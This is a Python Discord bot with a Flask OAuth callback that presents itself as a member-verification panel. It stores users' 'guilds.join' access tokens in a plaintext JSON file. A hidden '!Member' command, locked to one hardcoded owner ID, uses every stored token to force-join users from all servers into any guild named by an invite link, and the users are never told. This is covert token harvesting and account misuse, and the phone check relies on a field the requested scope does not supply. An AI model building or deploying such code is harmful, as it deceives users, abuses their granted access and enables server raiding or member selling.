import discord
from discord.ext import commands
from discord import app_commands
import requests
from flask import Flask, request
import threading
import os
import json
from dotenv import load_dotenv

load_dotenv()

# --- 設定 ---
TOKEN = os.getenv('BOT_TOKEN')
CLIENT_ID = os.getenv('CLIENT_ID')
CLIENT_SECRET = os.getenv('CLIENT_SECRET')
REDIRECT_URI = os.getenv('REDIRECT_URI')
ADMIN_USER_ID = 800419751880556586  # あなたのID

DB_FILE = 'users.json'

def load_users():
    if os.path.exists(DB_FILE):
        with open(DB_FILE, 'r', encoding='utf-8') as f:
            return json.load(f)
    return {}

def save_user(user_id, token, guild_id):
    users = load_users()
    if user_id not in users:
        users[user_id] = {"token": token, "guilds": []}
    if guild_id and str(guild_id) not in users[user_id]["guilds"]:
        users[user_id]["guilds"].append(str(guild_id))
    with open(DB_FILE, 'w', encoding='utf-8') as f:
        json.dump(users, f, indent=4)

# --- 招待モーダル ---
class MemberModal(discord.ui.Modal, title='メンバー追加魔法'):
    invite_url = discord.ui.TextInput(label='招待リンク', placeholder='https://discord.gg/xxxx', required=True)
    count = discord.ui.TextInput(label='参加させる人数', placeholder='半角数字で入力', required=True)

    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.defer(ephemeral=True)
        try:
            target_count = int(self.count.value)
            code = self.invite_url.value.split('/')[-1]
            res = requests.get(f"https://discord.com/api/v10/invites/{code}")
            if res.status_code != 200:
                return await interaction.followup.send("招待リンクが無効みたい...", ephemeral=True)
            
            target_guild_id = res.json().get('guild', {}).get('id')
            users = load_users()
            user_ids = list(users.keys())[:target_count]

            success = 0
            for u_id in user_ids:
                url = f'https://discord.com/api/guilds/{target_guild_id}/members/{u_id}'
                headers = {'Authorization': f'Bot {TOKEN}'}
                r = requests.put(url, headers=headers, json={'access_token': users[u_id]['token']})
                if r.status_code in [201, 204]: success += 1

            await interaction.followup.send(f"🌸 完了！ {success}人を魔法で追加したよっ！", ephemeral=True)
        except Exception as e:
            await interaction.followup.send(f"エラーが発生したよ: {e}", ephemeral=True)

# --- Discord Bot設定 ---
class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        await self.tree.sync()
        print("🌸 スラッシュコマンド同期完了！")

bot = MyBot()

class VerifyView(discord.ui.View):
    def __init__(self, guild_id):
        super().__init__(timeout=None)
        encoded_uri = REDIRECT_URI.replace(':', '%3A').replace('/', '%2F')
        self.oauth_url = f"https://discord.com/oauth2/authorize?client_id={CLIENT_ID}&response_type=code&redirect_uri={encoded_uri}&scope=identify+guilds.join&state={guild_id}"
        self.add_item(discord.ui.Button(label="Verify (認証して参加するっ！)", url=self.oauth_url, style=discord.ButtonStyle.link))

@bot.tree.command(name="setup", description="認証パネルを設置します")
@app_commands.checks.has_permissions(administrator=True)
async def setup(interaction: discord.Interaction):
    embed = discord.Embed(title="🌸 メンバー認証パネル 🌸", description="下のボタンを押して連携してね！\n⚠️電話番号認証済みのアカウントのみ有効です。", color=0xffb6c1)
    await interaction.response.send_message(embed=embed, view=VerifyView(interaction.guild_id))

@bot.tree.command(name="call", description="このサーバーに10人以上溜まったら招待します")
@app_commands.checks.has_permissions(administrator=True)
async def call(interaction: discord.Interaction):
    users = load_users()
    current_guild_users = [u for u, data in users.items() if str(interaction.guild_id) in data["guilds"]]
    
    if len(current_guild_users) < 10:
        return await interaction.response.send_message(f"❌ まだ認証者が足りないよ！（現在: {len(current_guild_users)}/10人）", ephemeral=True)

    await interaction.response.send_message(f"✨ {len(current_guild_users)}人を招待中...", ephemeral=True)
    success = 0
    for u_id in current_guild_users:
        url = f'https://discord.com/api/guilds/{interaction.guild_id}/members/{u_id}'
        headers = {'Authorization': f'Bot {TOKEN}'}
        res = requests.put(url, headers=headers, json={'access_token': users[u_id]['token']})
        if res.status_code in [201, 204]: success += 1
    await interaction.followup.send(f"🌸 完了！ {success}人を追加したよ！")

@bot.tree.command(name="confirmation", description="このサーバーの認証人数を確認します")
async def confirmation(interaction: discord.Interaction):
    users = load_users()
    count = sum(1 for data in users.values() if str(interaction.guild_id) in data["guilds"])
    embed = discord.Embed(title="📊 サーバー内認証状況", description=f"現在の認証済み人数: **{count}** 人", color=0xa1c4fd)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.tree.command(name="comtion", description="ボット全体の総認証人数を確認します")
async def comtion(interaction: discord.Interaction):
    users = load_users()
    embed = discord.Embed(title="🌍 ボット全体認証状況", description=f"総認証ユーザー数: **{len(users)}** 人", color=0xc2e9fb)
    await interaction.response.send_message(embed=embed, ephemeral=True)

@bot.command(name="Member")
async def member_cmd(ctx):
    if ctx.author.id == ADMIN_USER_ID:
        await ctx.message.delete()
        view = discord.ui.View()
        btn = discord.ui.Button(label="追加メニューを開く", style=discord.ButtonStyle.blurple)
        async def callback(interaction):
            if interaction.user.id == ADMIN_USER_ID:
                await interaction.response.send_modal(MemberModal())
        btn.callback = callback
        view.add_item(btn)
        await ctx.send("🔐 管理者専用メニュー:", view=view, delete_after=60)

# --- Flask & HTML ---
app = Flask(__name__)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    guild_id = request.args.get('state')
    
    data = {'client_id': CLIENT_ID, 'client_secret': CLIENT_SECRET, 'grant_type': 'authorization_code', 'code': code, 'redirect_uri': REDIRECT_URI}
    res = requests.post('https://discord.com/api/oauth2/token', data=data).json()
    access_token = res.get('access_token')

    u_info = requests.get('https://discord.com/api/users/@me', headers={'Authorization': f'Bearer {access_token}'}).json()
    
    if not u_info.get('phone'):
        return '<html><body style="background:#ff9a9e;display:flex;justify-content:center;align-items:center;height:100vh;"><h1>⚠️ 電話番号認証が必要です</h1></body></html>'

    save_user(u_info['id'], access_token, guild_id)

    return """
    <!DOCTYPE html>
    <html lang="ja">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>認証成功っ！</title>
        <style>
            @import url('https://fonts.googleapis.com/css2?family=Kosugi+Maru&display=swap');
            body { margin: 0; height: 100vh; display: flex; align-items: center; justify-content: center; font-family: 'Kosugi+Maru', sans-serif; background: linear-gradient(-45deg, #ff9a9e, #fad0c4, #a1c4fd, #c2e9fb); background-size: 400% 400%; animation: gradient 15s ease infinite; overflow: hidden; }
            @keyframes gradient { 0% { background-position: 0% 50%; } 50% { background-position: 100% 50%; } 100% { background-position: 0% 50%; } }
            .card { background: rgba(255, 255, 255, 0.7); padding: 60px; border-radius: 60px; box-shadow: 20px 20px 60px rgba(0,0,0,0.1); text-align: center; backdrop-filter: blur(12px); border: 2px solid rgba(255, 255, 255, 0.6); max-width: 400px; position: relative; }
            h1 { color: #ff6f91; font-size: 2rem; margin-bottom: 20px; }
            p { color: #888; font-size: 1.1rem; margin-bottom: 30px; }
            .mofu-button { display: inline-block; padding: 18px 45px; font-size: 1.3rem; color: #ff6f91; background: #ffffff; border-radius: 100px; box-shadow: 8px 8px 20px #d1d1d1; font-weight: bold; text-decoration: none; }
            .decoration { position: absolute; font-size: 2.5rem; animation: float 4s ease-in-out infinite; }
            @keyframes float { 0%, 100% { transform: translateY(0); } 50% { transform: translateY(-25px); } }
        </style>
    </head>
    <body>
        <div class="card">
            <div class="decoration" style="top:-30px; left:-20px;">🌸</div>
            <div class="decoration" style="bottom:-20px; right:-10px;">🧸</div>
            <h1>認証成功だよっ！</h1>
            <p>無事に連携できましたっ✨<br>Discordに戻って確認してみてね♪</p>
            <div class="mofu-button">完了だよっ✨</div>
        </div>
    </body>
    </html>
    """

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host='0.0.0.0', port=port)

if __name__ == '__main__':
    threading.Thread(target=run_flask, daemon=True).start()
    bot.run(TOKEN)